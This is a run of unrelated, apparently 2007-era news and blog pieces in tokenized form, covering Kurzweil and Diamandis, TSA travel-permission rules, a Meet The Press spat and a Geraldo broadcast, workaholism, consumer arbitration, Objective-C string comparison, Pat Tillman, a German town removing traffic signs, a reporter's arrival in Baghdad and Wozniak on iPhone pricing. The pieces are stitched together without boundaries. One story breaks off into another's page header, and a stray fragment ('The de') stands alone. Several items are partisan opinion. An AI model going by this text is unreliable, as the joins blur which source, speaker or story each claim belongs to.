The 45 - year - old Diamandis is best known as the creator of the X Prize , a $ 10 million bounty for the first privately built , manned rocket launched into space .
( Microsoft co-founder Paul Allen 's team won in 2004 . )
He 's developing a new X Prize for a 100 - mile - a - gallon car , and considering others in cancer research and , with Kurzweil 's help , AI .
Diamandis says he buys completely into Kurzweil 's Law of Accelerating Returns and everything that it implies .
" The Singularity , for anyone who stops and thinks about it , is completely obvious , " he says .
Diamandis , who has an MD , has also been profoundly affected by Kurzweil 's 2004 book Fantastic Voyage : Live Long Enough to Live Forever and has adopted Kurzweil 's dietary guidelines .
Diamandis pulls out a plastic bag of supplement pills and explains he 's up to about 30 a day .
Kurzweil reaches into his jacket for some of his own supplements .
" His pills are bigger than my pills ! " says Diamandis .
Then , more seriously , he asks Kurzweil if he ever gets nosebleeds from the supplement regimen .
Kurzweil does n't .
" I think it might be the memory pills , " says Diamandis .
The conversation morphs into a debate on why earthlings have been unable to detect extraterrestrial civilizations , because with the billions of star systems out there , surely the Law of Accelerating Returns must have taken root somewhere ...
It 's easy to ridicule a scene like this , and perhaps people will when the movie comes out .
( The documentary crew was there . )
It 's currently unfashionable to be so positive in one 's open - mindedness .
But remember , Kurzweil has been right before .
And frankly , he 's delighted we have n't heard from anyone else in the universe yet - it just means we 're further up the technology curve than the aliens .
" I think it 's exciting that we 're in the lead , " he says , fiddling with his half - eaten ahi tuna .
" There 's a lot ahead of us . "

Your government ( meaning the Department of Homeland Security ) is up to no good .
Beginning in February 2008 , U.S. Customs and Border Protection ( CBP ) will implement their ¨ Advance Passenger Information System ( APIS ) , ¨ the gist of which is that you will need permission from the United States Government to travel on any air or sea vessel that goes to , from or through the U.S .
The travel companies will not be able to issue a boarding pass until you are cleared by DHS .
This applies to ALL passengers , US citizens and visitors alike .
And how do you get said permission to travel ?
That ´s for your government to know and you to never find out .
Now TSA proposes to do for domestic travel what APIS will do for international routes .
That´s what I said : the new TSA rule would require that you obtain PERMISSION to travel within the U.S .
Here is the summary of their proposed rules , which seem so reasonable , couched as they are in the blandness of governmenteez [ emphasis added ] .
The Intelligence Reform and Terrorism Prevention Act ( IRTPA ) requires the Department of Homeland Security ( DHS ) to assume from aircraft operators the function of conducting pre-flight comparisons of airline passenger information to Federal Government watch lists for international and domestic flights .
[ snip ]
This rule proposes to allow TSA to ... receive passenger and certain non-traveler information , conduct watch list matching ... and transmit boarding pass printing instructions back to aircraft operators .
[ snip ]
TSA would do so in a consistent and accurate manner while minimizing false matches and protecting privacy information .
Right .
And I have a bridge in Brooklyn ...
We propose that , when the Secure Flight rule becomes final , aircraft operators would submit passenger information to DHS through a single DHS portal for both the Secure Flight and APIS programs .
This would [ result ] in one DHS system responsible for watch list matching for all aviation passengers .
Don´t you feel great knowing that your government will use economies of scale to protect you ?
Edward Hasbrough states that these rules are more insidious than merely complying to demands for ¨ Your papers please . ¨
He states ,
The proposal ... require[s ] that travellers display their government - issued credentials not to government agents but to airline personnel ( staff or contractors ) , whenever the DHS orders the airline to demand them .
But since the orders to demand ID of [ certain passengers ] will be given to the airline in secret , ... travellers will have no way to verify whether ... demands for ID are actually based on government orders .
Think about that : you will not be allowed to verify if the person demanding your papers is actually authorized to do so .
In addition , the airlines or their contractors ( or sub or even sub sub contractors ) have the right , under the proposed rules , to do anything they like with your personal information including :
keep copies of your passport ... as long as they like , use it , publish it , broadcast it , sell it , rent it , or pass it on to whomever they please .... [ T ] hey would have no obligation to get your permission for any of this .
Aside from the privacy issue , this is the DHS .
Their past performance is an indication of future returns and we can look forward to true travel nightmares beginning February 19 , 2008 .
Just think about the mess that occurred when CBP demanded that travelers to Canada and Mexico have a passport .
Multiply that by orders of magnitude to imagine what travelers will be facing .
If you can , please attend the TSA hearings on Thursday ( Grand Hyatt Washington , 1000 H Street , N.W. beginning at 8:00 am ) .
If you can´t attend in person , you have until October 22 , 2007 to submit written comments through the Docket Management System .
The docket number is TSA - 2007 - 28572 .
The Identity Project at Papers Please is working to prevent your government from robbing you of your right to privacy in your movements .

On this morning 's Meet The Press , Senior Cheney apologist and right wing sniper , Mary Matalin , threw a little hissy fit at Bob Shrum on the issue of Iraq and the upcoming presidential election .
As Shrum continually smacks down her spin , Matalin becomes increasingly perturbed and at the end of the segment as Mike Murphy was getting in some right wing spin of his own , she chucks her pen across the table in front of him , noticeably drawing his attention and making a loud noise as it bounced across the table and onto the floor .

The strain of an imploding Republican Party is have an obvious effect .
The quote below is what set her off , and whether you agree with Shrum 100 % on it or not , he smacked her down and pushed her over the edge .
Fox News ' Rivera ridicules 9/11 Truth activists , man arrested on camera RAW STORY
Published : Sunday September 9 , 2007
Print This Email This Says Geraldo
At Large host Geraldo Rivera to the crowd , chanting " 9/11 was an inside job " at the beginning of the show : " Get a life . "
The protesters continue chanting as Rivera reports on the high temperature in New York City ( 87 degrees Fahrenheit ) , causing the death of one dog left in a hot car .
As Dr. Jennifer Ashton explains , the heat from inside a car will cause a dog , unable to sweat , to go into organ failure .
As the chants continue in the background , Rivera and Ashton look over the results of a baking experiment .
The inside of the car used in the experiment , as it turns out , was hot enough to bake their batch of cookies to completion .
" The proteins in our body literally become denatured , " explains Dr. Ashton , of the effects of a hot car interior .
" They separate , and that 's how people die . "
As the protest continues off - screen , Judge Jeanine Pirro disagrees with a " free pass " given the mother of one particular child left in a hot car , citing cases in which the legal consequences were far worse with less harm caused to the child in question .
As a sign reading " Stop the Neocon Mad Men " is lifted over Rivera 's shoulder , he reports on a 42 - year - old Guatemalan immigrant with a criminal history who is found dead .
Judge Pirro and advocate Fernando Mateo express ultimate dissatisfaction in the charges brought against a police officer charged in the man 's death .
" We 've been surrounded by an activist - - radical - - I do n't know , Communist group .
I do n't know who the hell they are , " says Rivera after returning from commercial .
Vocal protests continue unabated in the background .
To screams and chants , Rivera and correspondent Laurie Dhue discuss the minutiae of Republican Senator Larry Craig 's arrest .
Also giving their input are psychologist Dr. Victoria Zdrok and three detectives who have worked on sex stings .
" As this group of misfits behind me continue their chanting , " Rivera quips , he waves his fist at the camera to express his annoyance .
Mark Geragos contends with a man with a loudspeaker , who was later arrested and identified as 33 - year - old Alex Jones , prominent figure in the 9/11 Truth Movement .
Jones was later charged with operating a bullhorn without a permit .
" All Hell is breaking loose on 6th Avenue , " says Rivera , as video is taken of police approaching the crowd to make arrests .
" You need a permit to protest -- or demonstrate -- here in New York , but this anarchist group came forward .
They really are one of the least attractive groups of demonstrators I 've ever seen . "
After a few more choice words and the desire to avoid using " foul language , " Rivera returns to his scripted story :
The story of Southwest Airlines passenger Kyla Ebbert , told to change her outfit by attendants .
In a gesture of solidarity , female correspondents Pirro , Zdrok and Ashton appear on stage with Ebbert in outfits identical to the one that prompted her booting from the plane .
" Did you realize that you were going to get caught in such a controversy ? " asks Rivera .
" Never , " responds the former Hooters waitress , with banners waving behind her and chants continuing in the background .
" I never imagined that this outfit would get me noticed for anything other than it's a very cute outfit . "
When asked if she could believe it when it was the outfit that caused her to be ejected from the flight , Ebbert affirmed that she could not have imagined that situation taking place .
Judge Pirro , while not sure if there are grounds for a lawsuit , commends Ebbert for standing her ground .
" This is why we live in a free country , " says Dr. Zdrok .
" We are free to wear what we want to wear as long as it's not offensive . "
" You have to be strong and stand by your beliefs , " says Dr. Zdrok to Ms. Ebbert .
" They should be more concerned about terrorism than someone as innocuous as a college student who 's dressed in the way kids dress , " says Pirro .
Ebbert is a student of international business , and has " now decided to pursue law . "
The following video is from Fox 's Geraldo at Large , broadcast on September 8 .
Back in the early ' 80s , when I was a young engineer at Texas Instruments headquarters in Dallas , my thoughts were mostly preoccupied with women and partying ... except at work , where I occasionally designed chips , too .
I worked with a bunch of college grads from all over the country .
We were all single and at the same stage in our lives .
There were road trips to New Orleans , New Braunfels ( for Wurstfest - - where Texans came every year to drink their weight in beer ) , the Guadalupe River , South Padre Island , and Colorado ( where we attempted to ski ) .
The rest of the time , you could find us at local bars -- it was always happy hour somewhere .
Those were good times ; we played hard and worked hung - over .
One day , I walked in on a conversation about the merits of bringing work home .
We were all violently opposed to the idea , except for this one guy , Dirk .
Dirk said he thought about the workday ahead on Sunday nights and when he got ready on weekday mornings .
Dirk was n't like the rest of us .
He was actually a mature adult .
Still , I remember feeling sorry for the guy .
I thought it was sad that work invaded his personal time like that .
At the time , I never thought about work until I was actually in the building , and even then , well , we already covered that .
Anyway , I was sure that whatever was wrong with Dirk would never happen to me .
Of course , it did , in spades .
Around 15 years ago work became my life .
It was actually kind of fun for a while .
I got a pass to neglect everything , all in the name of work .
I even got a workaholic key chain .
But after a while , had I been paying attention , I might have noticed more than a few signs that I 'd taken it a bit too far .
I started waking up in the middle of the night disoriented because I did n't know where I was .
Sometimes I 'd come home from an international trip and my wife would " forget " to pick me up at the airport .
Then , when I walked in the door , the dog would bark and growl at me .
Wait , it gets worse .
After years of living in the same place , none of my neighbors recognized me .
Then , one night , I noticed that my wife was n't wearing her wedding and engagement rings .
When I asked her about it , she said she had n't worn them in nine months .
And that probably led directly to the next sign : somebody pulled up in front of my house and served me with divorce papers .
Do n't feel sad for me .
Believe it or not , I 'm still married to the same woman , going on 18 years .
It 's a miracle .
Actually , I think she thinks it 's her karmic destiny to keep me from self - destructing .
She 'll probably be reincarnated as a saint .
Look , if you 're going to climb the corporate ladder , and especially if you aspire to the executive ranks , work will infringe on your home life .
That 's just par for the course .
Even now , as a part - time consultant , my mind is on work when it should n't be .
Perfect example : just today I was running and thinking about a work problem , and that 's when I had the idea to write this post .
I get some of my best ideas when I 'm in the shower , running , or lying in bed half asleep .
I like to work at night when my wife is watching TV , or laying out by the pool on the weekend .
Hell , I actually enjoy my work .
And an occasional business trip gives my wife and me a reason to miss each other .
There 's nothing wrong with the pursuit of money , achievement , or whatever it is you call success .
And , in this age of cell phones , BlackBerrys and notebook computers , work is more a part of our personal lives than ever before .
It 's only a problem when work , or the pursuit of success , becomes so much a part of your personal life that it impedes your pursuit of happiness .
It 's all about knowing where to draw the line .
Only you know when you 're not spending enough time with your family .
Or when you 're not working out enough , eating too much fast food , or otherwise neglecting your health and well - being .
You know when you 're not getting enough " me " time for you to effectively manage stress , relax and gain some perspective .
The irony is that , if you 're a workaholic , you 'll be the last person to notice any of that stuff .
Unless , of course , you 're reading this .
The bottom line :
As I 've said before , working hard and being driven are good things , especially in terms of climbing the corporate ladder .
But you need to be mindful of overdoing it .
This may be counterintuitive , but in my experience , when I put too much pressure on myself , it always came back to haunt me .
And the times I played hooky when I should n't have , never mattered in the end .
When I learned to relax and have fun working , that 's when my career took off .
Remember that the next time someone asks you why you 're killing yourself for work .
The fine print associated with service agreements from credit card , wireless phone , Internet access , and other service contracts is increasingly likely to includes a clause that removes contract disputes from the legal system , subjecting them instead to binding arbitration .
Superficially , arbitration sounds like a great way to settle disagreements while avoiding the fees and animosity associated with legal action ; arbitrators ostensibly offer an impartial decision quickly and painlessly .
But a report ( PDF ) issued by the consumer watchdog group Public Citizen portrays the process as heavily slanted towards business , and a Kafkaesque nightmare for individuals .
The report was triggered by the fact that California , alone among the states , compels the law firms that handle arbitration rulings to list the results of their decisions .
Public Citizen downloaded each individual decision made by the firm National Arbitration Forum during the period from 2003 to 2007 and performed a statistical analysis on the outcomes .
The results provide a revealing window into the arbitration process .
Arbitration is apparently used largely as a debt collection mechanism and is almost uniformly triggered by the service providers .
Of the 34,000 cases examined , all but 15 involved debt collection , and only 118 were instigated by consumers .
Given the high levels of consumer debt , a high rate of success might be expected , but the study found that companies prevailed in a startling 95 percent of the cases .
The records also suggest that very little care goes into many of these decisions , as it documents a number of cases where arbitrators decided over 50 cases in a single day , with the consumer losing in all of them .
These data do not appear to be a California aberration ; a court case involving the NAF and First USA Bank in Alabama revealed that the credit card issuer prevailed in over 19,900 out of 20,000 cases there .
The report also details anecdotal cases where people were hit with adverse rulings by arbitrators despite evidence of fraud , identity theft , and even mistaken identity .
More compelling is Public Citizen 's description of the arbitration process , which goes a long way towards explaining the skewed statistics .
As the instigators of the process , corporations can choose the firm that performs the arbitration , and can shop for those that have provided the most favorable outcomes in the past .
They also have the option of rejecting the initial choice of arbitrators , allowing those with pro-consumer records to be screened out .
Both the firms and individual arbitrators are paid on a per-case basis , and thus are under pressure to ensure they are viewed favorably by companies .
Consumers , in contrast , have very few rights .
Arbitration can proceed provided the company has attempted to notify the individual ; actual consumer awareness of the proceedings appears to be optional .
There are also fees at nearly every stage of the process , including a fee simply to have a hearing on the dispute or to see the ruling itself .
Having the reasoning behind the decision spelled out requires a fee paid in advance of the actual decision .
Appeal options are limited , and even a flawed initial ruling is n't grounds for reversal .
Finally , arbitration does n't allow individuals to pool resources through class action status .
Given how the deck appears to be stacked , why would anyone ever agree to mandatory arbitration ?
In many cases , it 's simply a matter of ignorance of the risks involved ; the report includes a list of steps to take to avoid entering into a contract that includes mandatory arbitration .
But in some instances , such as Internet or phone access , consumers may have few options and find these clauses hard to avoid .
As a long term solution , Public Citizen urges support for the Arbitration Fairness Act of 2007 ( PDF ) , which amends existing laws to limit binding arbitration to cases where the two parties have equal power within existing contracts .

The de
One of my guilty pleasures is hanging out on Mac programming IRC channels ( # macsb and # macdev on irc.freenode.net )
Occasionally an interesting discussion erupts over some esoteric topic , but for the most part it ’s ordinary questions about the basics of Cocoa programming .
One misconception about Objective - C that comes up occasionally is the assumption that Objective - C does more than it does .
In particular things like
“ I compare two strings / objects / dictionaries with == , and the test fails .
Cocoa is broken ! ” ( quickly followed by the Mac sucks , Xcode blows goats , and so on )
or
“ Can I concatenate two strings by using + ? ” ( quickly followed by the Mac sucks , Xcode blows goats , ObjC2 should have gotten operator overloading , and so on )
Objective - C is a pretty old language , predating Java , Perl , Pythong , Ruby , and many of the modern features of C ++.
It is just C with a couple of extra knobs on it , with very little extra behavior added to the language .
All of the magic is in the runtime which does message dispatching .
There is no operator overloading in the language .
Pretty much all the language lets you do is interact with integer and floating point values , and calculate addresses via pointers and offsets .
In C and Objective - C , there is no implicit complex behavior hiding behind the operators .
Now , folks who come from VB ( I presume ) , Java , scripting languages , and C++ expect things like the == operator to be an equality operator , knowing the contents of the objects being compared ; or expect the + operator to be a concatenating operator , dynamically creating objects .
Think about what happens under the hood : comparing two strings compares each of the characters in the string ( looping over the contents ) , or comparing two dictionaries would compare each of the elements in the dictionary ( looping over the keys ) .
Likewise , to concatenate two strings , you ’ll probably be looping over the two , or allocating blocks and using a memcpy ( ) - like operation .
( and in general , using concatenation to build strings can bite you when you go to internationalize your application )
C and Objective - C do n’t do anything that convenient .
All == does is compare a small number of bytes for an address when dealing with pointers or an integer / float value .
And when you come down to it , those are the same operation .
In particular , no looping .
All + does is add two values .
In particular , no allocations .
So , when you ’re dealing with Objective - C , and things do n’t behave the way you think they should , consider what ’s going on under the hood :
NSString * thing1 = ... ; NSString * thing2 = ... ; if ( thing1 == thing2 ) {
This is just pure C right here ( no @ ‘s or [ ] ‘s are involved , so the Objective - C part of the world does n’t kick in .
No ( ) ‘s involved , so no function calls are happening .
Therefore , only a small number of bytes are involved .
Each string could be megabytes long , but the comparison will just be four bytes ( eight bytes on a 64 - bit system ) .
So this is just testing whether one address is equal to another address .
An “ identity test ” , vs a test for equivalency , which is what the programmer probably wanted in the first place .
Assuming that the two strings are not pointing to the same @ " literal NSString " , these will have different addresses , and the comparison will be a false one .
( it ’s not my nose , it ’s a false one )
Now this code :
if ( [ thing1 isEqualToString : thing2 ] ) {
Does do an equivalency test .
Since you ’re actually invoking a method here , and methods are arbitrary code , this has the opportunity to loop through the strings and compare them character by character .
So the moral of this poorly - organized story ?
C is dumb about data .
It only does a few blindingly simple things .
Objective - C is a very thin layer on top of C , and adds nothing to the existing C syntax .
If you ’re getting unexpected results with the built - in operators , you ’re probably assuming the base language is doing more than it should , and you should update your expectations appropriately .
And while I ’m thinking about it , I ’m quite glad Objective - C does not have operator overloading .
The gotchas are just too subtle , and I do n’t mind trading some extra typing or an explicit function or method call in exchange for not having to track down subtle changes in behavior when some class I ’m using decides to overload an operator .
Hint : in C++ , how does operator&& change behavior when it ’s overridden , vs the compiler default ?
You ’d be surprised how many experienced C++ developers do n’t know that bit of trivia .
If you really want operator overloading ( it does make sense in some situations , like the canonical matrix libraries everyone seems to be writing , or at least using for examples of why overloading is a Good Thing ) , there ’s always Objective - C++.

The AP is reporting new details about the death of former NFL player Pat Tillman , who was killed under suspicious circumstances in Afghanistan in 2004 :
Army medical examiners were suspicious about the close proximity of the three bullet holes in Pat Tillman ’s forehead and tried without success to get authorities to investigate whether the former NFL player ’s death amounted to a crime , according to documents obtained by The Associated Press .
“ The medical evidence did not match up with the , with the scenario as described , ” a doctor who examined Tillman ’s body after he was killed on the battlefield in Afghanistan in 2004 told investigators .
The doctors – whose names were blacked out – said that the bullet holes were so close together that it appeared the Army Ranger was cut down by an M - 16 fired from a mere 10 yards or so away .
Henry Waxman ’s Committee on Oversight and Government Reform held a hearing in late April , nearly three years to the day that Tillman was gunned down in Afghanistan , examining how the military spun the circumstances of Tillman ’s death ( the Pentagon originally claimed Tillman was killed by enemy fire during an ambush ) .
Waxman is not letting the issue drop .
He has scheduled a hearing next week that will zero in on what senior Pentagon officials knew about Tillman ’s death and when they knew it .
Among those called to testify is former Defense Secretary Donald Rumsfeld .
No word yet on whether Rummy will accept the invite , but check back here for coverage of the hearing .
This crazy giant catapult , probably built by Wile E. Coyote out of two construction cranes and ACME industrial - grade rubber bands , is designed to send a man into space with no security cables or net .
As you will see in the video , after surviving the bazillion - G - force launch in one piece , he has to open a parachute to return safely to land .
After seeing this 125 times today , I 'm convinced this guy should have been the pilot of the X - Wing rocket .

From September 12 , all traffic controls will disappear from the center of the western town of Bohmte to try to reduce accidents and make life easier for pedestrians .
In an area used by 13,500 cars every day , drivers and pedestrians will enjoy equal right of way , Klaus Goedejohann , the town ’s mayor , told Reuters .
“ Traffic will no longer be dominant , ” he said .
The idea of removing signs to improve road safety , called “ Shared Space , ” was developed by Dutch traffic specialist Hans Monderman , and is supported by the European Union .
The EU will cover half of the 1.2 million euros ( $ 1.66 million ) it will cost Bohmte to ditch its traffic lights .
Monderman ’s ideas have already been implemented in the town of Drachten in the north of the Netherlands , where all stop lights , traffic signs , pavements , and street markings have gone .
“ It ’s been very successful there , ” Goedejohann said , adding that accidents in Drachten had been reduced significantly .
Officials in Fuerstenberg / Havel , a small town north of Berlin , are also considering adopting the “ Shared Space ” scheme .
But not everyone is confident it will work .
“ Just because it worked in the Netherlands does n’t mean it will work here , ” said Werner Koeppe , a road specialist at Berlin ’s Technical Traffic Institute .
Welcome to Baghdad
By Michael J. Totten
BAGHDAD --
Never again will I complain about the inconvenience and discomfort of airports and civilian airline travel delays .
You wo n’t either if make your way from Kuwait to Baghdad in July during a war .
Military planes leave Kuwait every couple of hours for Baghdad International Airport ( or BIAP , pronounced BIE - op ) .
The United States Army ’s media liaison in Kuwait dropped me off at the airfield so I could take a flight “ up . ”
I waited twelve hours in a metal folding chair in a room full of soldiers who , for obvious reasons , had priority over me for available seats .
At least I had a meal .
On the other side of the base a McDonalds and Pizza Hut were tucked inside trailers supplied by Kellogg , Brown , and Root ( KBR ) .
KBR seems to have built almost everything here that the military uses as housing and storage .
Out of plywood , plastic , and sheet metal they construct instant aesthetically brutal outposts of America , which somehow look and feel specifically like outposts of Texas .
I ordered a pizza from a Pakistani employee at the Pizza Hut trailer and paid with American dollars .
They do n’t use coins on the base .
They do n’t even have coins on the base .
If your food costs , say , $ 5.75 and you pay with six dollars , you ’ll get a small round cardboard disk or chit that says “ 25 cent gift certificate ” on it as change .
All night I waited for a flight and was bumped again and again by soldiers on their way to places like War Eagle , Victory , and Fallujah .
Finally I got on a manifest and gathered around a gruff barking sergeant with everyone else .
“ I want you all back here in 20 minutes , ” he bellowed .
“ First , I want you to go to the bathroom .
Then I want to see you standing in front of me with a bottle of water . ”
I went to the bathroom even though I did n’t have to .
Then , as ordered , I pulled a cold bottle of water out of the fridge .
We lined up with our gear and marched single file into the plane .
I felt awkwardly out of place and also like I was in the army myself at the same time .
The plane was windowless and loud as 100 lawnmowers .
I crammed pink foam plugs into my ears , strapped on my body armor , and seat belted myself into the side of the plane .
“ Hang your bags on the hooks ! ” barked the sarge .
“ Hang them all the way up ! ”
“ Do n’t fall asleep , ” said the soldier next to me .
“ When you see the rest of us grab our helmets , put yours on , too .
We ’ll be beginning the spiral dive into Baghdad . ”
“ To avoid flying low over hostiles ? ” I said .
“ Something like that , ” he said .
This was not United Airlines .
The funny thing about the steep corkscrew dive is that I could n’t feel it .
Anyone who says it is scary , as some journalists do , is talking b.s .
If you ca n’t look out the window or see the instruments in the cockpit , you ’ll have no idea if the plane is right - side up , flying in a straight line , upside down , sideways , or even spinning into a death spiral .
I ’m not sure how the others knew when to put on their helmets .
Perhaps someone signaled .
No one could hear anything over the roar of the plane through their ear plugs .
The landing was smooth and felt no different from an American Airlines touch down in Los Angeles .
The back of the plane opened up onto the tarmac .
Light like a hundred suns blinded my darkness - adjusted and dilated eyes .
I could barely make out the dim shape of military aircraft behind us amidst the pure stunning brilliance .
My first view of Baghdad looked exactly as I expected it would – like another world .
We dismounted the plane and I stepped into harsh blazing sunshine .
You know how it feels when you get into a black car in the afternoon with the windows rolled up in July ?
It ’s an inferno outside , but inside the car it ’s even hotter ?
That ’s how Iraq feels in the shade .
Sunlight burns like a blowtorch .
If you do n’t wear a helmet or soft cap the sun will cook your brain .
First you get headaches .
Then you end up in the hospital .
Getting from BIAP to the IZ ( the International Zone , aka the Green Zone ) is an adventure all by itself .
First you haul your gear to a bus stop that feels like Crematoria .
Then you get on the bus and ride for 45 minutes to an army base .
Then you get off that bus and wait an hour to catch another bus .
Then you get off that bus and wait for an hour to catch yet another bus to yet another base .
Then you wait in the sun yet again – and by this time you ’re totally fragged from the heat – and take another damn bus to a helipad .
All this takes hours .
You will be no closer to Baghdad than you were when you started .
There are no short cuts .
Once you make your way to the helipad you will wait for a flight on a Blackhawk or a Chinook .
If you ’re a civilian like me , you will fly last .
I waited for my helicopter flight with two other civilians – Willie from Texas and Larry from Florida .
Willie and Larry work construction for private companies in harsh places like Iraq and Afghanistan .
They are both well - rounded individuals with Red State tastes and political views and a worldliness and cosmopolitanism that surpasses that of most people who live in the Blue States .
They are n’t allowed to tell me how much money they make , but it is many hundreds of thousands of dollars per year .
“ You get hooked on making money , ” Willie said .
“ You think you can do it for one year or two , then quit , but it ’s like a drug .
Or like when you get one tattoo – all of a sudden you want two tattoos .
My wife keeps saying , come on , you can do it for just one more year . ”
“ My wife would hate it if I was out here for years , ” I said .
“ You get vacation , ” Larry said .
“ You get more vacation than French people .
21 days every four months .
And you do n’t have to pay taxes if you take your vacation outside the U.S.
Your wife can meet you in the Bahamas . ”
A KBR employee who coordinates the Blackhawk flights called our names on the manifest .
“ Get your gear , let ’s go , let ’s go , let ’s go ! ”
Military rules require all Blackhawk passengers to wear long - sleeved shirts .
This was the first I ’d heard of it , and I had n’t brought any long - sleeved shirts with me to Iraq .
Why would I ?
It ’s 120 degrees in the shade .
Willie let me borrow an extra sweatshirt .
I put that on , then my body armor , then my helmet , then my sunglasses which double as ballistic eye protection .
Then hauled my 100 pounds of gear out onto the landing zone and lined up with the soldiers .
KBR and the army made all of us stand there in line , waiting and broiling in the sun .
We waited .
And waited .
And waited .
My clothes were as drenched as if I had fallen into a pool .
This is the army .
Comfort is not a factor .
None of the soldiers complain about heat .
They just take it , and they get much hotter than me .
They wear not only Kevlar like I do , but full kit body armor with SAPI plates .
Our Blackhawk helicopter was ready .
“ Move out ! ” bellowed the KBR flight coordinator .
Larry , Willie , and I ran behind a line of soldiers toward the Blackhawk .
“ Hold up ! ” said the coordinator .
The Blackhawk pilot lifted off without picking up one single passenger .
“ Man , ” said the coordinator as he shook his head .
The roar of the chopper rotors quickly receded .
“ No one was mission critical so they did n’t want to give anybody a ride .
I do not know what to tell you . ”
“ F*ck ! ” Willie screamed .
We hauled our gear back to the waiting area and sat .
I drank a bottle of water in seconds .
It disappeared inside me .
I could n’t even tell I had drank it .
“ Last year in Afghanistan , ” Larry said , “ I waited a week for a flight .
Choppers flew in and out all day every day .
I showed up on the LZ for every flight , had my gear ready , and kept getting bumped .
A whole week , just to fly one from place to another .
At least I was on the clock .
We might be here a while . ”
We were there for a while .
Not for a week , but for 12 hours .
We kept getting bumped by new soldiers who showed up with places to go .
A second time the pilot took off without picking anyone up .
I could n’t figure out why he even bothered to land .
Dozens of people needed a ride .
On another occasion Larry , Willie , and I made it all the way to the helicopter itself before we got kicked for some reason .
I tried to embrace the suck .
Willie got increasingly agitated .
“ Good thing I do n’t have my glock with me ! ” he yelled after we got bumped for the sixth time .
“ I ought to pour a bottle of water on that electrical board over there and short out the whole frigging place . ”
After the sun went down the air mercifully cooled , down to 100 degrees or so – which is lovely after 120 , especially when there is no longer burning sunlight .
Tiny bats flew over the base from the direction of a reedy lake a few hundred meters away .
There were no bugs .
I watched helicopters fly over the city in the distance and launch burning white countermeasure flares to confuse heat - seeking missiles as the pilots flew over hostile parts of the city .
This was the only evidence I saw that I was in a war zone .
I heard no shots fired , and I heard no explosions .
After having spent several days Baghdad ’s Green Zone and Red Zone , I still have n’t heard or seen any explosions .
It ’s a peculiar war .
It is almost a not -war .
Last July ’s war in Northern Israel and Southern Lebanon was hundreds of times more violent and terrifying than this one .
Explosions on both sides of the Lebanese - Israeli border were constant when I was there .
You ’d think explosions and gunfire define Iraq if you look at this country from far away on the news .
They do not .
The media is a total distortion machine .
Certain areas are still extremely violent , but the country as a whole is defined by heat , not war , at least in the summer .
It is Iraq ’s most singular characteristic .
I dread going outside because it ’s hot , not because I ’m afraid I will get hurt .
“ I read on the Internet that the war costs 60 billion dollars a year , ” Larry said .
“ Well , if it ’s on the Internet it must be true , ” I said jokingly .
A soldier heard me and swiveled his head .
“ Did you just say that ? ” he said incredulously .
“ You ’re with the media and you just said that ?
Man , we ought to throw your ass right out of here . ”
I laughed , but he was only barely just kidding .
Most soldiers and officers I ’ve casually met so far are not hostile .
Most ignore me unless I say hi to them first .
Others say hello or good morning first and call me “ sir . ”
Some are eager to chat .
They all seem to want to know where I ’m from .
Lots of them are from Georgia and Texas .
Larry , Willie , and I finally got on a Blackhawk at 2:00 in the morning ( oh two hundred in milspeak . )
We strapped ourselves in our seats and piled our hundreds of pounds of luggage on top of us .
Blackhawk helicopters do n’t have windows .
The sides are open to the air .
Fierce hot blasts of wind distorted the shape of my face as we flew fast and low over the roof tops and street lights and palm trees and backyards of the city .
Baghdad is gigantic and sprawling .
It looks much less ramshackle from the air than I expected .
Individual cities - within - a - city are home to millions of people all by themselves .
The sheer enormity of the place puts the almost daily car bomb attacks into perspective .
The odds that you personally will be anywhere near the next car bomb or IED are microscopic .
A few minutes after takeoff from the helipad we landed on a runway in the IZ , or the Green Zone .
The soldiers left in Humvees .
Willie , Larry , and I were left at the airbase alone .
My two traveling buddies had rides picking them up , but no one was waiting for me , nor would someone show up .
I was expected to make my way to CPIC , the press credentialing center , but how could I do that at 2:30 in the morning ?
There were no taxis or busses to take .
“ You can sleep tonight at our compound , ” Larry said , “ and find your way to the press office tomorrow when it ’s open . ”
I would have been in trouble if I had n’t met these two guys .
I may have been deposited in the reasonably safe Green Zone , but wandering around loose on my own in Baghdad , in the middle of the night , hauling 100 pounds of luggage , sleep - deprived , in extreme heat , and with nowhere to sleep does not put me in my happy place .
Mike Woodley showed up in an SUV to give Larry a ride .
He said he could get me a bed at their compound before he realized I did not yet have a badge .
“ They wo n’t let you in , ” he said .
“ Ca n’t we just tell them I ’m on my way to CPIC to pick up my badge ? ” I said .
“ Does n’t matter , ” he said .
“ If you do n’t have it , the guards will not let you in . ”
“ Is there a hotel I can check into ? ” I said .
“ What about the Al Rashid ? ”
“ Al Rashid is in the Red Zone , ” he said .
“ And you ca n’t get in there without a badge either . ”
Actually , the Al Rashid is in the Green Zone , right on the edge of it .
But Mike was right about the hotel guards not letting me in without a badge .
And I needed to get to the press office during business hours to get it .
“ What should I do ? ” I said .
I did not want to sleep on the sidewalk in Baghdad .
Mike pondered my options .
And he came up with a great one .
“ I can get into the embassy with my badge , ” he said , “ and I can get you a temporary badge and a bed . ”
That ’s exactly what he did .
He got me a temporary badge into the embassy annex , and he got me a bed with a pillow and fresh linens .
For only the second time in a week , I got to sleep in a bed .
And I was one lucky bastard .
The embassy annex , and the bed I got to sleep in , was at the grandest downtown palace built by Saddam Hussein .
The tyrant is dead , and I got to sleep at his house on my very first night in his capital .
What better welcome to Baghdad could anyone possibly ask for ?

Apple cofounder Steve Wozniak Saturday blasted his old buddy Steve Jobs ' decision to drop the price of the iPhone by $ 200 only 68 days after the big launch and even took his old friend to task for how refunds have been handled for the popular device .
" Nobody expects a product to drop that much in price in such a short time , " said Wozniak , the driving force behind the original Apple I and II computers .
" Steve Jobs and everyone expects technology to drop in price .
The first adopters always pay a premium .
I am one of them .
I am used to that .
But that one was too soon , too harsh . "
Wozniak , or Woz , as he is known by geeks and admirers made the comments in a question and answer session with reporters following an address before 600 solution providers at the ConnectWise Partner Summit in Tampa , Fla .
Jobs , Apple 's CEO , sparked a firestorm of protest when he lowered the price of the iPhone on September 5 by $ 200 from $ 599 to $ 399 only 68 days after the launch of the eagerly awaited device that Apple fans waited in long lines and snapped up by as soon as it hit the market .
The pricing decision upset a lot of early iPhone purchasers .
Jobs , who cofounded Apple with Wozniak , responded with a public letter of apology to those early iPhone buyers and and offered a " $ 100 store credit towards the purchase of any product at an Apple Retail Store or the Apple Online Store . "
But Wozniak complained that he has bought some iPhones that he is saving as gifts for people which he can't get a refund on right now .
Only when an account is opened can that person who received the phone get the discount , he said .
" If I bought it and gave it as a gift they get the discount , " he said of the Apple $ 100 credit policy for early iPhone buyers .
" Why do n't you just take my receipt and give me the money back ?
And of course it always comes back to Apple Store credit .
